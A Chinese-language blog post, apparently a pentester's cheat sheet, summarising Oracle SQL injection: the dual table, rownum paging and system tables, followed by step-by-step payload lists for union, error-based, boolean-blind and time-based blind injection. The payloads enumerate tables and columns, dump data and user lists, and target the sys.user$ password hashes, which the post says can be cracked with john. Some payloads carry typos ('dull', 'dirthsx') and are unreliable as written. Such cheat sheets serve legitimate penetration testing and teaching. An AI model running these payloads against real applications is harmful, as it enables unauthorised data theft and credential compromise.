---
layout: post_layout
title: Oracle 注入总结
time: 2019年12月13日 星期五
location: 杭州
pulished: true
excerpt_separator: "**2.**Oracle 的数据类型是强匹配型"
---

### **一、基础知识**

**1.**Oracle 使用查询语句获取数据时需要跟上表名，没有表的情况下可以使用 "from dual"。
Dual 是 Oracle 的虚拟表，用来构成 select 的语法规则。Oracle 保证 dual 里面永远只有一条记录。

**2.**Oracle 的数据类型是强匹配型，在 Oracle 进行类似 union 查询数据时候必须让对应位置上的数据类型和表中的列的数据类型是一致的。可以使用 null 代替某些无法快速猜测出数据类型的位置。（不同于 mysql，使用 select 1,2,3 即可）

**3.**Oracle 的单行注释符号是 "-- "(杠杠空格)，多行注释符号 "/\*\*/"。

**4.**Oracle 的 rownum 是一个虚拟列，是 Oracle 根据查询结果进行编号的列。因为是根据查询结果进行编号，所以在使用 order by 时需要特别注意，因为 order by 是对查询结果进行排序，所以如果想根据 order by 的结果进行排序，需要使用嵌套语句，例如：

```
select rownum,id,name from students

| rownum| id | name |
|   1   | 35 | 张三 |
|   2   | 30 | 李四 |
|   3   | 22 | 王二 |

select rownum,id,name from students order by id

| rownum| id | name |
|   3   | 22 | 王二 |
|   2   | 30 | 李四 |
|   1   | 35 | 张三 |

select rownum,id,name from (select * from students order by id)

| rownum| id | name |
|   1   | 22 | 王二 |
|   2   | 30 | 李四 |
|   3   | 35 | 张三 |
```

> 参考链接：https://www.cnblogs.com/songhengchao/p/8996255.html

Rownum 不能以任何表的名称作为前缀。

**5.**Oracle 和 mysql 不一样，不能使用 limit 进行分页查询，只能借助 rownum 使用三层查询嵌套的方式实现分页，例如:

```
SELECT * FROM ( SELECT A.*, ROWNUM RN FROM (select * from session_roles) A WHERE ROWNUM <= 10 ) WHERE RN >= 6 -- 输出查询结果中第6到第10条的结果。
```

**6.**常用表：

```
user_tab_columns、all_tab_columns、dba_tab_columns /* 保存了表结构信息。常用字段 "table_name"、"column_name" 等。 */

user_tables、all_tables、dba_tables /* 保存了表信息。常用字段 "table_name"、"owner" 等。 */

user_users、all_users、dba_users /* 保存了用户信息。常用字段 "username"。 */

sys.user$ /* 保存了用户信息，查询需要 admin 权限。常用字段 "user"、"password" 等。 */
```

**7.**常见权限：

```
查看用户权限：select * from session_privs

CREATE_SESSION -- 默认权限，可连接数据库 + 创建 session。

SELECT ANY DICTIONARY -- 高级权限，可查看任何表、任何视图。

CREATE PROCEDURE -- 低级权限。
```

**8.**密码 hash：

Oracle 的用户密码可以使用 john 或者 cain and abel 进行破解，加密方式基于 DES，salt 为用户名。

---

### **二、Union注入**

**Step 1.**判断列数：
`' order by 3 --`

**Step 2.**判断回显位置：
`' union select null,null,null from dual --`

**Step 3.**判断每个位置的数据类型：
`' union select 'null',null,null from dual -- 每个位置加单引号，观察是否报错。`

**Step 4.**获取数据库版本信息：
`' union select null,(select banner from sys.v$version where rownum=1),null from dual --`

**Step 5.**获取表名：
`' union select null,(select table_name from user_tables where rownum=1),null from dual --`
`' union select null,(select table_name from user_tables where rownum=1 and table_name<>'table_1'),null from dual --`
**Step 6.**获取列名：
`' union select null,(select column_name from user_tab_columns where table_name='table_1' and rownum=1),null from dual --`
`' union select null,(select column_name from user_tab_columns where table_name='table_1' and column_name<>'column_1' and rownum=1),null from dual --`
**Step 7.**获取数据：
`' union select null,(select column_1，column_2，column_3 from table_1 where rownum=1),null from dual --`

拼接：
`' union select null,(select column_1||','||column_2||','||column_3 from table_1 where rownum=1),null from dual -- 拼接多个字段用到的连接符号是 "||"。在 Oracle 中，concat() 函数只能连接两个字符串。`

**Other 1.**：获取当前数据库名：
`' union select null,(select sys.database_name from dull),null from dual --`

**Other 2.**：爆数据库名：
`' union select null,(select DISTINCT owner from all_tables where rownum=1),null from dual --`

**Other 3.**：获取当前用户名：
`' union select null,(select user from dull),null from dual --`

**Other 4.**：爆用户名：
`' union select null,(select username from all_users where rownum=1),null from dual --`
`' union select null,(select user from sys.user$ where rownum=1),null from dual -- 需要高权限。`
**Other 5.**：查看权限：
`' union select null,(select * from session_privs where rownum=1),null from dual --`

> 参考链接：http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet

---

### **三、报错注入**

如果发现了数据库报错信息，可以优先选择报错注入。不同于 mysql 可以直接用函数进行报错，Oracle 和 Mssql 类似，需要使用 1 = [报错语句]、 1 > [报错语句] 等比较运算符。

常用函数：

**utl_inaddr.get_host_name()**
`' and 1=utl_inaddr.get_host_name((select user from dual))-- `

**ctxsys.drithsx.sn()**
`' and 1=ctxsys.dirthsx.sn(1,(select user from dual))-- `

**XMLType()**
`' and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null-- `

> 注：1 = [报错语句] 和 [报错语句] is not null 均可。

**dbms_xdb_version.makeversioned()**
`' and (select dbms_xdb_version.makeversioned((select user from dual)) from dual) is not null-- `

**dbms_xdb_version.checkin()**
`' and (select dbms_xdb_version.checkin((select user from dual)) from dual) is not null-- `

**dbms_xdb_version.uncheckout()**
`' and (select dbms_xdb_version.uncheckout((select user from dual)) from dual) is not null-- `

**dbms_utility.sqlid_to_sqlhash()**
`' and (SELECT dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual) is not null-- `

**ordsys.ord_dicom.getmappingxpath()**
`' and 1=ordsys.ord_dicom.getmappingxpath((select user from dual),user,user)-- `

**dbms_xmltranslations.extractxliff**

**dbms_streams.get_information**

**dbms_xmlschema.generateschema**

---

### **四、布尔盲注**

如果页面没有报错，但是可以通过页面返回是否正常来判断 SQL 语句是否被执行，此时可以尝试布尔型盲注。主要通过 ASCII()、substr() 等组合判断来获取数据。

**decode()**
`' and 1=(select decode(substr(user,$1$,1),'$A$',1,0) from dual)-- `

该语句表示，如果 user 的第一位的值是 'A'，则返回1，否则返回0。

> 注：加 $ 处表示爆破点。

```
substr(参数1, 参数2, 参数3)

参数1：要截取的字符串

参数2：起始位置

参数3：截取长度

从字符串 [参数1] 中 [参数2] 的位置为起点，截取长度为 [参数3] 的字符串。
```

```
decode(参数1， 参数2，参数3，参数4，...， 参数n)

参数1：条件

参数2：判断值1

参数3：返回值1

参数4：判断值2

参数5：返回值2

...

参数n：缺省值

如果 [条件] 等于 [判断值x]，则返回 [返回值x]，否则返回 [缺省值]。
```

**instr()**
`' and 1=(instr((select user from dual),'SYS'))`

该语句表示，如果在 user 中存在 'SYS'，则返回 'SYS' 在字符串中的位置，否则则返回0。

```
instr(参数1，参数2)

参数1：被查询字符串

参数2：查询字符串

在 [被查询字符串] 中查询是否存在 [查询字符串]，如果存在则返回 [查询字符串] 在 [被查询字符串] 中的位置，否则返回0。
```

---

### **五、时间盲注**

通过页面响应时间的不同，判断 SQL 语句是否被执行。一般使用函数或者高耗时的 SQL 操作初步判断是否存在时间盲注，接着配合 decode()、case 语句、if 语句等方式爆破数据。

**制造时延**

函数：

DBMS_PIPE.RECEIVE_MESSAGE()

> DBMS_PIPE.RECEIVE_MESSAGE('任意值', 延迟时间)

高耗时 SQL 操作：

select count(\*) from all_objects

select count(\*) from ALL_USERS T1, ALL_USERS T2, ALL_USERS T3, ALL_USERS T4, ALL_USERS T5

**判断注入点**

```
' and 1=(DBMS_PIPE.RECEIVE_MESSAGE('a',10)) and '1'='1

' and 1=(select count(*) from all_objects) and '1'='1

' and 1=(select count(*) from ALL_USERS T1, ALL_USERS T2, ALL_USERS T3, ALL_USERS T4, ALL_USERS T5) and '1'='1

如果返回包发生时延，则可能存在注入点。
```

**获取数据**

```
配合 decode()

' and 1=(select decode(substr(user,1,1),'S',(select count(*) from all_objects),0) from dual) and '1'='1

如果发生时延，则 user 的第一位是 'S'。
```
```
配合 case

' and 1=(case when (ASCII(substr(select user from dual),1,1)<96) then (select count(*) from ALL_USERS T1, ALL_USERS T2, ALL_USERS T3, ALL_USERS T4, ALL_USERS T5) else 1 end) and '1'='1'

如果 user 的第一位的 ASCII 码的值小于96，则产生时延。使用 ASCII() 时需要使用二分法逐步猜解这一位的字符的 ASCII 码值。
```